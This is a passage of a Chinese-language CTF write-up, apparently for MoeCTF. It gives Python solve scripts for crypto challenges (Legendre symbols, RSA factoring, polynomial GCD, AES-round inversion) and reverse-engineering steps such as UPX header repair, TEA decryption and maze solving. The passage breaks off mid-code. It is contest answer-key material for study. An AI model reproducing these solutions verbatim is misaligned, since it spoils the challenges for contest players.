    print(decrypted_flag)

```

### ezlegendre

```python
from Crypto.Util.number import long_to_bytes

p = 258669765135238783146000574794031096183
a = 144901483389896508632771215712413815934
ciphertext = [
    102230607782303286066661803375943337852, 196795077203291879584123548614536291210, 41820965969318717978206410470942308653,
    207485265608553973031638961376379316991, 126241934830164184030184483965965358511, 20250852993510047910828861636740192486,
    103669039044817273633962139070912140023, 97337342479349334554052986501856387313, 159127719377115088432849153087501377529,
    45764236700940832554086668329121194445, 35275004033464216369574866255836768148, 52905563179465420745275423120979831405,
    17032180473319795641143474346227445013, 29477780450507011415073117531375947096, 55487351149573346854028771906741727601,
    121576510894250531063152466107000055279, 69959515052241122548546701060784004682, 173839335744520746760315021378911211216,
    28266103662329817802592951699263023295, 194965730205655016437216590690038884309, 208284966254343254016582889051763066574,
    137680272193449000169293006333866420934, 250634504150859449051246497912830488025, 124228075953362483108097926850143387433,
    232956176229023369857830577971626577196, 149441784891021006224395235471825205661, 118758326165875568431376314508740278934,
    222296215466271835013184903421917936512, 49132466023594939909761224481560782731, 406286678537520849308828749751513339,
    215122152883292859254246948661946520324, 81283590250399459209567683991648438199, 150395133067480380674905743031927410663,
    5710878479977467762548400320726575491, 83627753774286426170934105100463456109, 164968224377869331545649899270867630850,
    241057183685774160581265732812497247167, 109136287048010096863680430193408099828, 116313129605409961931811582899075031153,
    202739016625709380026000805340243458300, 25408225921774957745573142542576755590, 151336258796933656160956289529558246702,
    2947189044370494063643525166023973095, 228678413963736672394976193093568181979, 40627063032321835707220414670018641024,
    55446789315226949622969082042881319148, 32219108726651509070669836923591948459, 134454924722414419191920784435633637634,
    97952023967728640730045857104376826039, 20659076942504417479953787092276592682, 93281761173713729777326842152860901050,
    133634773495582264000160065317239987936, 79976720152435218818731114555425458470, 234654694673289327542859971371886984118,
    51332273108989067644245919615090753756, 134120280423303717489979349737802826605, 182001158305920226320085758522717203725,
    98408798757865562737462169470346158516, 78200435603900368619334272308272773797, 232796357836930341547987600782979821555,
    589106968861493082018132081244848952, 24186003230092331554886767628744415123, 236070626491251466741246103662922841423,
    238699080882667864827094121849090696547, 141659873734297659078160283051728812410, 228977113517120063860252637394240795552,
    236613527842969921794004708284265628300, 145522034982744654991661857596541755396, 249608374387044047328725156440984678776,
    325110572051913836681821746093704556, 171492052199838424502681030556098576483, 156498865212994371079795360268866413702,
    196747701509389071931992996873572785043, 70811811603137896158765356680364490781, 83672551582385607422240464086955462541,
    117961603623637997457153763936550310698, 224448821395214505399297116719025174412, 4598815373009554321735225938200807251,
    194892269604260726530091473301914449005, 127484628022155760909820605666827662175, 208706240846212140439291547368645656474,
    14102286481104997303651684152195298336, 6129503335471304345451795609683770657, 103799668048593149396277157385628834185,
    185813375481410513002496683918106238351, 233491689316882978147517340230794025796, 46274083097168831187719988888816378961,
    119487551553664772614629936285345836934, 84340029922118279362389419277915602509, 88253743193124528032223101368846247085,
    227895357640018330099501504941388167432, 92189947144174433744195727086236905626, 83114957902192791332190922428847199876,
    173535754090441937731619031520699325122, 192309407933789484835602071782330798398, 255421921600128994923738650157598053776,
    155535082468314012733563336837641958625, 49064798421022327310707074253263463055, 161216416471071644769301963857685054031,
    252480348817188872515008985698620059851, 75854882798183185741756645038434215611, 256065006192683011190132982128640682537,
    87507510173514424105732562474643251223, 163309795132131534875147566536485288212, 253583084320404985699510129361746869059,
    253300112521651972637580307326576568313, 239027717080729650738678032571840680727, 117444657686971615526398894470673026034,
    215470942802874046857958621181684551426, 58767098748728136687851735836323448020, 249357164697409977883764098879705065535,
    174705348385893117518084017669958647345, 211108767177375215605155301209259781232, 57829566748907062397366819001461941421,
    88265742700024922112974862134385921564, 80952107622167923709226013231566882261, 236078582132483864916117213281193714198,
    193448482646563141692726575550417225891, 245972799166806058223048506073553726233, 10132977708896091601871557249244373666,
    201785418152654519825849206312616081028, 15169816744048531212384271865884567710, 122545328290385950043826822277924297182,
    202918646192255177261567701479991753600, 32696887488223731055835744711207261936, 88319352182963224921157305627381030375,
    92381505322264045777004475690398861771, 189745654013352563126968415157143821842, 152254915005998949299817641843658795579,
    198032433618991362619448347415342295581, 84073892809321676935569114878067118319, 82243805869584256211699602267760745768,
    61994229948266781537191603999495995852, 253668765227759797787675352833142466255, 38865376724677211964966907748953557125,
    134615436811268347303232550777225944929, 176932422465426107783498083830285780588, 207573742393618910694054452362826628208,
    200033130835394442710748301293534928706, 127536063935293533700918451145963158658, 219125698281820710910675956971948816959,
    179795893258398750139395156587561075767, 69649628109726874051635160004398498964, 241433717681314766463039563422535023524,
    202664264135718511331695232476272832350, 205151096657425932591242432052912914182, 210305712465948130683966275157181140301,
    196555690055906934925300527324955477733, 66817932643964538216259564711698986077, 95270796440975607179107356182889534333,
    123226880424532374188134357659879826495, 53506495440223773538415807620524749240, 19253217887083870834249774316467647628,
    165699356396365023442008488156823647206, 107809175498119862854792975070673056027, 250453989887421415931162217952559757164,
    171492052199838424502681030556098576483, 133778166882550119563444625306816232463, 149009301604122447269581792013291889175,
    9982418254629616281350713836647603294, 203486292122499140756846060502464655972, 157686696123400087437836943220926921848,
    88338919773540412238116717043122711811, 113265824169274322024623493892867211478, 5549372099744960679418616304893848801,
    12431828907518852062050349123660880165, 183957934738536914983862053251433028750, 42027289270308356303682029801998790750,
    117406080036483925915502666019795783905, 154312255292300186042636734144948304054, 143706917273862261295046346995206133170,
    50088136095338601440516112338120787526, 250634504150859449051246497912830488025, 8073010289877796888705519374892639903,
    40049582814576788803483039836229025416, 227012342545923833983403067401561291645, 201776603581414625783054400184026088994,
    55474945478884522762318445841998187357, 221515530211550293408010846844218019597, 172650752042211610909190315288155597255,
    67046194931321172530462444254204111483, 207435868835185636819659137800256834557, 188063222224545200294767050268070647452,
    58099349021260301211275261896736590564, 23598877596106927870697531042828774738, 58546308516383335224739442370238545000,
    58125311541947998710088435169901475101, 238219925698115060748249043752036454438, 203910234934340893915761800653823457631,
    190854889967769152565565000250829375099, 37573623890629846209257307181880876288, 226220240200270623843038279593586687278,
    144246075981535671790438155977352345487, 14665770553338784222331493932533448756, 37992062606775322664977502677838074649,
    47370175759976523832233910009306151684, 97047813247943880266351445874642842468, 237607444658797800072728280983357541134,
    174853113478993738890584814806707459112, 17104608155861584438824639050715857607, 83639027011494777283064583268678718843,
    237826165608708003941944469905843354705, 231707683915242052796886276983724691027, 146089830852925550139294146760718642221,
    25604562707667550478623425477029052785, 108577663147976992047614498924706939204, 69040319834829375335287614995435269276,
    169933229202934375632745753379104389929, 72693008284867494808267387710985847974, 158548279589965576940349068403862889270,
    49458101234256610254825879149914255140, 24389558269688411084589654047215902968, 210567980379246548727819953025607019254,
    110423375132252997825868399832298953831, 109589895677661968369424757992411668628, 66177577069199763925999718357846633613,
    83602293803708828242273186265396676466, 172226271050176278536911356541786290551, 85799805809703976643034084477579915867,
    179399990302447560847151603157937241688, 81687654752229170984692833277072534294, 160766441640281044008645821822296569868,
    100306680611749750243920501921769642984, 42195187332833922597871030332905266026, 238918420772178508359295233180536910768,
    221685929158944699801776621298532178665, 209349638787804999657456057184702655805, 183953393268431043006359511952782903516,
    137364333131365794683132159746962959967, 15637689373906596015395350692459218048, 145956368418289159411911667337899986262,
    197987711355277581048877821432652325207, 125421308989313724733467092345532539875, 90525081516582408488547894471421476595,
    107405840115256692042814887586009104950, 71587500700172519801649824611045199280, 10155721246869986043302768283257682883,
    100522792569358427133597834727509523742, 244473925018526409824670892423775482110, 50746138425761666610345252577572889037,
    142188269919422432629363225167297071042, 8235113926890598897465093754260801947, 174540885017405784646782293055852044631,
    171949847901434672429841435895697323702, 34391199559497599434575002007581170988, 7337868660819385932166025474594964373,
    89608475952042154068811282935241824949, 162561097613906905390170334328135062933, 252566077272083954707900007055640560669,
    4284637988579219107997224848114896904, 220026371387782427901244689037957398829, 86019060485320999498155965142619258089,
    19304861731281576405798605142335886482, 123188238667151068575810494833929221938, 125089740978532716086813732154638565196,
    252061524500088702951562270741214799294, 89528875472312768404823823905699760649, 63307407053590054220492282094909190524,
    24389558269688411084589654047215902968, 43835777110183833958990705735152973942, 196543204310466258426232803779025620993,
    225032412767857179129234169288824097261, 50292890880286260984317361296226049436, 64928956886509273090981701066528078331,
    25408225921774957745573142542576755590, 235921667882292842303120860570747218086, 217132603855089441017750752624514343437,
    11106129204256119599329380588789107048, 147501327490657927610543345089238991876, 158091159632919983870444592039392730373,
    254215886971254771885657857148535673338, 129869106474614345624950211566868568809, 10425702332274469498479699675668087022,
    136595953187315682777976356839442311764, 1607792140397737044118662059498732982, 23710000155612873207506044342091514799,
    118571340370877720354330132780832828911, 194624784476702188629452374731837038856, 51332273108989067644245919615090753756,
    24092104340528851160365826273938845156, 158670188709175825212687487436006138030, 133641825913283256858340618209700716053,
    43054466484232130048301271684438593412, 20361972967806283315536154125012604660, 135700832615866572032111395529532615300,
    160609169788639387827865051539103507016, 100576279475451993660766480883708996211, 215424685541583305069271024253690375127,
    60018956375784961551937423504137141702, 107997941230633604720421526632224279451, 219482010609171816035007605036664317041,
    22173526221024380740269311947729076493, 249746554302052221287371350978970766087, 93207359085331319264650563354951254906,
    221421697282310997113867048083058096452, 61834092635779365101011109381392037516, 162215218701897689647766394615098617152,
    141856131587452385513407955541400099703, 177910903795887762773545874929605680469, 228832704523723308335513552177377803295,
    229427981969125094398744034150988525118, 217938760689082034514008764751385239765, 3238055163645731541423094980789895030,
    42308449860804765793467328093112118974, 254764518926620089428032312378507653680, 215733901156118606036318409454786603209,
    59640829345183339336712595595022506261, 33515071724475649656070325837411550208, 51175659069843551646353202764296812462,
    211462959696081863041546889096760952490, 230559603938699838189391087728971115767, 85878911733601049548471257838175175563,
    214134904074265214033878852207103328297, 160702405980652445507529591230654474171, 223755040649990285320102091954198427148,
    166476753890268002826149533120107157745, 26283916639129998224675164834425763384, 232971495542024495583092055361321729894,
    79741799146769724681649849525636816379, 228506526471280046809909301748098760369, 167502422063741368765891061653686283332,
    26984184590668253713951516794937308166, 105952393031190074432183821281493254, 113823192955281698937767041115166174652,
    93264047694114869263275726820602569731, 55481974783112950660682138071588408040, 108961894273530837550182447112767144669,
    47975793549419083945738147934068241928, 204024371586357035343484206754422857590, 251859351272989525849999231358507018068,
    75939709807860493804628805619699991501, 129031774446142139804436921156668129187, 110764318451937254261883856778359218969,
    246404864722813298477426808193494673610, 153818236564405157581869620439634140065, 246125932167584353084676586883038397451
]


exponent = (p - 1) // 2
symbol_for_zero = pow(a, exponent, p)
binary_flag = ""
for c in ciphertext:
    current_symbol = pow(c, exponent, p)
    if current_symbol == symbol_for_zero:
        binary_flag += '0'
    else:
        binary_flag += '1'

flag_bytes = b''
for i in range(0, len(binary_flag), 8):
    byte_str = binary_flag[i:i+8]
    flag_bytes += long_to_bytes(int(byte_str, 2))

print(f"Flag: {flag_bytes.decode('utf-8')}")

```

### happyRSA

```python
from Crypto.Util.number import long_to_bytes
import gmpy2


n = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731
e = 65537
c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886
x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141


# n_phi^2 + n_phi + (1 - x) = 0
delta1 = 4 * x - 3
n_phi = (gmpy2.isqrt(delta1) - 1) // 2

print(f"n_phi: {n_phi}")


# S = p + q = n_phi + 1
S = n_phi + 1
# p和q是方程 z^2-Sz+n=0 的根
# z = (S+/-sqrt(S^2-4n))/2
delta2 = S*S - 4*n
sqrt_delta2 = gmpy2.isqrt(delta2)

p = (S + sqrt_delta2) // 2
q = (S - sqrt_delta2) // 2

print(f"p: {p}")
print(f"q: {q}")
assert n == p * q



phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(f"Flag: {flag.decode()}")

```

### ezHalfGCD

```python
import gmpy2
from Crypto.Util.number import long_to_bytes
from math import comb

e = 11
n = 31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243
enc_d = 13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212
enc_phi = 7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145
enc_flag = 894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686



def poly_trim(p):
    while p and p[-1] == 0:
        p.pop()
    return p

def poly_mul(p1, p2, mod):
    deg1, deg2 = len(p1) - 1, len(p2) - 1
    new_poly = [0] * (deg1 + deg2 + 1)
    for i in range(deg1 + 1):
        for j in range(deg2 + 1):
            new_poly[i + j] = (new_poly[i + j] + p1[i] * p2[j]) % mod
    return poly_trim(new_poly)

def poly_divmod(a, b, mod):
    a, b = list(a), list(b)
    if not b:
        raise ZeroDivisionError
    deg_a, deg_b = len(a) - 1, len(b) - 1
    if deg_a < deg_b:
        return [0], a
    
    q = [0] * (deg_a - deg_b + 1)
    lead_b = b[-1]
    try:
        inv_lead_b = gmpy2.invert(lead_b, mod)
    except ZeroDivisionError:
        factor = gmpy2.gcd(lead_b, mod)
        return (factor, None)

    while deg_a >= deg_b:
        lead_a = a[-1]

        coeff = (lead_a * inv_lead_b) % mod
        deg_diff = deg_a - deg_b
        q[deg_diff] = coeff

        for i in range(deg_b + 1):
            a[deg_diff + i] = (a[deg_diff + i] - coeff * b[i]) % mod
            
        a = poly_trim(a)
        deg_a = len(a) - 1
        
    return poly_trim(q), a

def poly_gcd(a, b, mod):

    while b:
        res, rem = poly_divmod(a, b, mod)
        if rem is None:
            return res
        a, b = b, rem
    return a

# 构造多项式 P1(x) = x^e - enc_d

P1 = [-enc_d % n] + [0] * (e - 1) + [1]

flag_found = False
for k in range(1, e):
    print(f"k = {k}")
    
    # 构造多项式 P2(x) = (e*x - 1)^e - enc_phi * k^e
    # 使用二项式定理展开 (e*x - 1)^e
    # (a+b)^n = sum(C(n,k) * a^k * b^(n-k))
    # a = e*x, b = -1
    P2 = [0] * (e + 1)
    for i in range(e + 1):
        # x^i 项的系数是 C(e, i) * (e^i) * (-1)^(e-i)
        coeff = (comb(e, i) * pow(e, i, n) * pow(-1, e-i, n)) % n
        P2[i] = coeff
    
    # P2(x) = P2(x) - enc_phi * k^e
    P2[0] = (P2[0] - (enc_phi * pow(k, e, n)) % n) % n

    # 计算 GCD，看是否能找到 n 的因子
    result = poly_gcd(list(P1), list(P2), n)

    # 检查结果。如果它是一个整数，那就是 n 的因子
    if isinstance(result, int) or isinstance(result, gmpy2.mpz):
        p = result
        if 1 < p < n:
            q = n // p
            if p * q == n:
                phi = (p - 1) * (q - 1)
                d = gmpy2.invert(e, phi)
                print(f"d: {d}")
                
                m = pow(enc_flag, d, n)
                flag = long_to_bytes(m)
                print(f"Flag: {flag.decode()}")
                flag_found = True
                break
            else:
                print("error")
    else:
        # 如果 GCD 是一次多项式 a*x + b，根是 -b/a
        g = poly_trim(result)
        if len(g) == 2: # 一次多项式
            b0, a1 = g[0], g[1]
            try:
                inv_a1 = gmpy2.invert(a1, n)
                d = (-b0 * inv_a1) % n
                if pow(d, e, n) == enc_d:
                    print(f"d: {d}")
                    m = pow(enc_flag, d, n)
                    flag = long_to_bytes(m)
                    print(f"Flag: {flag.decode()}")
                    flag_found = True
                    break
            except ZeroDivisionError:
                pass # 这个系数不可逆，说明我们又找到了一个因子
                
if not flag_found:
    print("error")

```

### Ledengre_revenge

10轮加密，用了aes，可以写出逆，注意索引变换

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.Cipher import AES

p = 251
e = 65537
p_ = 71583805456773770888820224577418671344500223401233301642692926000191389937709
key_pow = 1679283667939124174051653611794421444808492935736643969239278575726980681302
text_sq = 26588763961966808496088145486940545448967891102453278501457496293530671899568
a = [[239, 239, 251, 239], [233, 227, 233, 251], [251, 239, 251, 233], [233, 227, 251, 233]]
lis0_given = [[341, 710, 523, 1016], [636, 366, 441, 790], [637, 347, 728, 426], [150, 184, 421, 733]]
lis1_given = [[133, 301, 251, 543], [444, 996, 507, 1005], [18, 902, 379, 878], [235, 448, 836, 263]]

def function(x, pp):
    y = 0
    if x >= pp:
        y = x
    elif pow(x, (pp - 1) // 2, pp) == 1:
        y = pow(x, 2, pp)
    else:
        y = pow(x, 3, pp)
    return y

#预计算逆
reverse_251 = [[] for _ in range(256)]
for x in range(256):
    y = function(x, 251)
    if y < 256:  # ensure
        reverse_251[y].append(x)
unique_ps = {227, 233, 239, 251}
reverse_a = {}
for pa in unique_ps:
    rev = [[] for _ in range(256)]
    for x in range(256):
        y = function(x, pa)
        if y < 256:
            rev[y].append(x)
    reverse_a[pa] = rev

#爆破key
key = None
for k in range(1 << 16):
    if pow(k, 2 * e, p_) == key_pow:
        key = k
        break
print(f"Found key: {key} (binary: {bin(key)[2:].zfill(16)})")

#AES key
aes_key_bytes = long_to_bytes(key << 107)
cipher = AES.new(aes_key_bytes, AES.MODE_ECB)

def tonelli_shanks(n, pp):
    if n == 0:
        return 0
    leg = pow(n, (pp - 1) // 2, pp)
    if leg != 1:
        return None
    q = pp - 1
    s = 0
    while q % 2 == 0:
        q //= 2
        s += 1
    z = 2
    while pow(z, (pp - 1) // 2, pp) != pp - 1:
        z += 1
    m = s
    c = pow(z, q, pp)
    t = pow(n, q, pp)
    r = pow(n, (q + 1) // 2, pp)
    while True:
        if t == 0:
            return 0
        if t == 1:
            return r
        i = 1
        t2 = pow(t, 2, pp)
        while t2 != 1:
            t2 = pow(t2, 2, pp)
            i += 1
        if i == m:
            return None
        b = pow(c, 1 << (m - i - 1), pp)
        m = i
        c = pow(b, 2, pp)
        t = (t * c) % pp
        r = (r * b) % pp

#求平方根
sqrt_r = tonelli_shanks(text_sq, p_)
if sqrt_r is None:
    print("No square root found, error")
    exit(1)
r1 = sqrt_r
r2 = p_ - sqrt_r
candidates = [r1, r2]

def reverse_half(current_text, lis_given):
    current = bytearray(current_text)
    for round_num in range(9, -1, -1):
        bit_pos = 9 - round_num
        enc_list = []
        multiple_positions = []
        has_multiple = False
        for row in range(4):
            for col in range(4):
                k = row * 4 + col
                y = current[k]
                pa = a[row][col]
                thresh = pa // 2
                bit = (lis_given[row][col] >> bit_pos) & 1
                possible_x = [x for x in reverse_a[pa][y] if (x > thresh) == (bit == 1)]
                possible_z = set()
                for x in possible_x:
                    possible_z.update(reverse_251[x])
                if not possible_z:
                    return None
                possible_z = list(possible_z)
                enc_list.append(possible_z)
                if len(possible_z) > 1:
                    has_multiple = True
                    multiple_positions.append((k, possible_z))
        
        if has_multiple:
            return None
        else:
            enc_bytes = bytearray([lst[0] for lst in enc_list])
            prev = cipher.decrypt(enc_bytes)
            current = bytearray(prev)
    return bytes(current)

flag = None
for r in candidates:
    full = long_to_bytes(r)
    if len(full) < 32:
        full = b'\x00' * (32 - len(full)) + full
    if len(full) != 32:
        continue
    text0 = full[:16]
    text1 = full[16:]
    flag0 = reverse_half(text0, lis0_given)
    if flag0 is None:
        continue
    flag1 = reverse_half(text1, lis1_given)
    if flag1 is None:
        continue
    flag_candidate = flag0 + flag1
    print(f"{flag_candidate}")

```



## reverse

### speed

动态调试在creatwindow下断点，单步调试，flag在window上，照抄即可

### base

标准base64，直接解码即可

### catch

nop掉exception即可

### upx

upx脱壳，简单异或加密，注意输入的最后是换行符，因此可以倒推：

```python
v6 = [
    35, 43, 39, 54, 51, 60, 3, 72, 100, 11,
    29, 118, 123, 16, 11, 58, 63, 101, 118, 41,
    21, 55, 28, 10, 8, 33, 62, 60, 61, 22,
    11, 36, 41, 36, 86
]

flag_chars = [0] * 35
next_char = 10

for i in range(34, -1, -1):
    current_char = v6[i] ^ 0x21 ^ next_char
    flag_chars[i] = current_char
    next_char = current_char
flag = ''.join(chr(c) for c in flag_chars)
print("Flag:", flag)

```

### ez3

本来爆破出来了一个，但是交上去不对，后来才发现有多解，于是把每个位置所有可能值都打印出来看看哪个符合flag格式

```python
def cpp_srem(a, n):
    if n == 0:
        return a
    rem = a % abs(n)
    if a < 0:
        return -rem
    return rem

def find_all_solutions():
    a = [
        0xB1B0, 0x5678, 0x7FF2, 0xA332, 0xA0E8, 0x364C, 0x2BD4, 0xC8FE,
        0x4A7C, 0x18, 0x2BE4, 0x4144, 0x3BA6, 0xBE8C, 0x8F7E, 0x35F8,
        0x61AA, 0x2B4A, 0x6828, 0xB39E, 0xB542, 0x33EC, 0xC7D8, 0x448C,
        0x9310, 0x8808, 0xADD4, 0x3CC2, 0x796, 0xC940, 0x4E32, 0x4E2E,
        0x924A, 0x5B5C
    ]

    all_options = [[] for _ in range(34)]
    for i in range(34):
        b_prev = a[i - 1] if i > 0 else 0
        for char_code in range(32, 127):
            if i == 0:
                calc_val = 47806 * char_code
            else:
                calc_val = (47806 * (char_code + i)) ^ b_prev ^ 0x114514
            b_i = cpp_srem(calc_val, 51966)
            if b_i == a[i]:
                all_options[i].append(chr(char_code))
    flag = ""
    for i, options in enumerate(all_options):
        print(f"位置 {i:02d}: {options}")
        if options:
            flag += options[0]
        else:
            flag += "?"
    print(f"moectf{{{flag}}}") #这个是根据所有第一个候选值拼接出来的，不一定对


if __name__ == '__main__':
    find_all_solutions()

```

### flower

只有一句需要处理的花指令，je，jne相当于必定跳转，于是下面导致静态分析出问题的jmp可以直接nop掉，之后分析算法，发现给的key解出来是乱码，猜测会修改key，由于key只有一字节，爆破即可

```python
def solve(key):
    enc = [
        0x4F, 0x1A, 0x59, 0x1F, 0x5B, 0x1D, 0x5D, 0x6F, 0x7B, 0x47, 0x7E,
        0x44, 0x6A, 0x07, 0x59, 0x67, 0x0E, 0x52, 0x08, 0x63, 0x5C, 0x1A,
        0x52, 0x1F, 0x20, 0x7B, 0x21, 0x77, 0x70, 0x25, 0x74, 0x2B
    ]
    initial_key = key
    content_chars = []
    for i in range(len(enc)):
        current_key = initial_key + i
        encoded_value = enc[i]
        original_char_code = encoded_value ^ current_key
        content_chars.append(chr(original_char_code))
    content = "".join(content_chars)
    flag = f"moectf{{{content}}}"
    return flag

if __name__ == '__main__':
    for i in range(0x100):
        flag = solve(i)
        print(i,flag)

```

### A cup of tea

tea加密

```python
import struct

def decrypt(v, k):
    v0, v1 = v
    delta = 0x114514
    s = delta * 32
    for _ in range(32):
        v1 -= (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3])) & 0xFFFFFFFF
        v1 &= 0xFFFFFFFF
        v0 -= (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1])) & 0xFFFFFFFF
        v0 &= 0xFFFFFFFF
        s -= delta
        s &= 0xFFFFFFFF
    return [v0, v1]

key = [289739801, 427884820, 1363251608, 269567252]
cipher = [
    2026214571, 578894681, 1193947460, 
    -229306230 & 0xFFFFFFFF, 73202484, 961145356, 
    -881456792 & 0xFFFFFFFF, 358205817, -554069347 & 0xFFFFFFFF, 
    119347883
]
cipher_blocks = [cipher[i:i+2] for i in range(0, len(cipher), 2)]
decrypted_flag = b""
for block in cipher_blocks:
    decrypted_block = decrypt(block, key)
    decrypted_flag += struct.pack('<LL', decrypted_block[0], decrypted_block[1])
print(decrypted_flag.decode('utf-8').strip('\x00'))

```

### ezpy

丢给PyLingual，可得py源码：

```python
def caesar_cipher_encrypt(text, shift):
    result = []
    for char in text:
        if char.isalpha():
            if char.islower():
                new_char = chr((ord(char) - ord('a') + shift) % 26 + ord('a'))
            elif char.isupper():
                new_char = chr((ord(char) - ord('A') + shift) % 26 + ord('A'))
            result.append(new_char)
        else:
            result.append(char)
    return ''.join(result)
user_input = input('please input your flag：')
a = 1
if a != 1:
    plaintext = user_input
    shift = 114514
    encrypted_text = caesar_cipher_encrypt(plaintext, shift)
    if encrypted_text == 'wyomdp{I0e_Ux0G_zim}':
        print('Correct!!!!')
```

凯撒密码，shift为114514，cyberchef一把梭

### mazegame

迷宫题，能直接提取字符串迷宫，bfs即可（所以为什么flag不对路径做一下哈希，也太长了吧）

```python
import collections

def solve():
    maze_data = [
        "11111111111111111111111111111111111111111111111111111111",
        "10100000000000000010000011011101011111111101011100000111",
        "10111010111111111010111011000001000001000001000101110111",
        "10000010000010000010001011011111111101110111011101110111",
        "10111111111011101110111011010000000000010100010001110111",
        "10100000001000101000100011010101111111011101110101110111",
        "10101011111110111011101011010101000001000000010101110111",
        "10101010000010100000101011110101110101111101111111110111",
        "10111010111010101111101011100101000100000101000101110111",
        "10000010001010001000001011001111011111010101011101110111",
        "11111011101011111011111111101000100000101100101001110111",
        "10001010001000100010000010001010011000100010010011000001",
        "10111010111110101010111011011001011111010101011101011101",
        "10001010001000001010001011000101000100000101000101011101",
        "11101011101111111011101011110101110111111101110101011101",
        "10001000101000001010001011000100010100000101000101011101",
        "10111111101011101110111011011111110101110111011101011101",
        "10001000001000100000001011000100000100010000000101011001",
        "11101011111011111111101011110101111101111111110101011011",
        "10101000000010001000101011010100000001000100010101011011",
        "10101111111110101010101011010111111111010101010101011011",
        "10100000000000100010101011010000000000010001010101011011",
        "10111111111111111110111011011111111111111111011101011011",
        "10000000001111000000000011110111010000111100011111011011",
        "11101111100000011011011111111010110111011101100001011011",
        "11101111111111111011011111111101110111101101100001011011",
        "10001000111111000010000011111010110111011101100001011011",
        "10111010111111111010111011110111010000111101100001010011",
        "10000010000010000010001011111111111111111101100001010111",
        "10111111111011101110111011110001000110001101100001010001",
        "10100000001000101000100011110111011101111101100001011101",
        "10101011111110111011101011110001000101111101100001011101",
        "10101010000010100000101011111101011101111101100001011101",
        "10111010111010101111101011110001000110001101100001011101",
        "10000010001010101000001011111111111111111101100001011101",
        "11111011101011111011111110000000000000001101100001011101",
        "10001010001000100010000011111111111111111100110011011101",
        "10111010111110101010111010010000000011111110001111011101",
        "10001010001000001010001010110111000001111110100101011101",
        "11101011101111111011101000110011001111111100110111011101",
        "10001000101000001010001011111111111111111111110111010001",
        "10111111101011101110111010100001001100000000000011011011",
        "10001000001000100000001011111111111101011101111001011011",
        "10101011111011111111101011000000000001000100010111011011",
        "10101000000010001000101010010111111111111111111111011011",
        "10101111111110101010101010110111111111111111111101011011",
        "10100000000000100010101011100000000000000000000011011011",
        "10111111111111111110011011111111111111111111111011011011",
        "10000011111111111111000010000000000000000000000000011001",
        "11111011111111111111111111111111111111111111111111111101",
        "11111011100001100110110111000000000000000000000111111101",
        "11111011101111011010000111011111111111111111110111111101",
        "11111011100001000010110110000111111111111111110000000001",
        "11111011101111011010110111101111111111111111111111111111",
        "11110000000000011000110000000000000000000000000000000011",
        "11111111111111111111111111111111111111111111111111111111",
    ]
    padded_maze = [row.ljust(56, '1') for row in maze_data]
    start_pos = (1, 1)   # (y, x)
    end_pos = (15, 32) # (y, x)
    height = 56
    width = 56
    queue = collections.deque([(start_pos[0], start_pos[1], "")])
    visited = {start_pos}

    while queue:
        y, x, path = queue.popleft()
        if (y, x) == end_pos:
            return path
        moves = {
            'D': (y, x + 1),
            'S': (y + 1, x),
            'A': (y, x - 1),
            'W': (y - 1, x),
        }
        for move_char, (next_y, next_x) in moves.items():
            if 0 <= next_y < height and 0 <= next_x < width:
                if (next_y, next_x) not in visited and padded_maze[next_y][next_x] == '0':
                    visited.add((next_y, next_x))
                    new_path = path + move_char
                    queue.append((next_y, next_x, new_path))
    return "None"

if __name__ == '__main__':
    solution_path = solve()
    print("path：")
    print(solution_path)

```

### upx_revenge

附件中的1.exe打不开，用cff加载发现file size比pe size少了4byte，用ida打开发现start函数前面4个push被吞了，所以缺失的4字节在upx0区段前，观察upx头，有版本号`4.24`但是没有魔数`UPX!`，并且`4.24`后紧跟的`0D 24 02 08`是upx压缩方法，所以缺失的4字节正好是`UPX!`，插入`UPX!`保存，能成功`upx -d`，拖进ida，发现是base64+异或，直接解即可

```python
import base64

cipher = r"lY7bW=\ck?eyjX7]TZ\}CVbh\tOyTH6>jH7XmFifG]H7".encode('latin1')


b64_bytes = bytes([b ^ 0x0E for b in cipher])
print("b64 string:", b64_bytes.decode('latin1'))
plain = base64.b64decode(b64_bytes)
print("bytes:", plain)

```

### Two cups of tea

xtea+xxtea

```python
import struct

def U32(x):
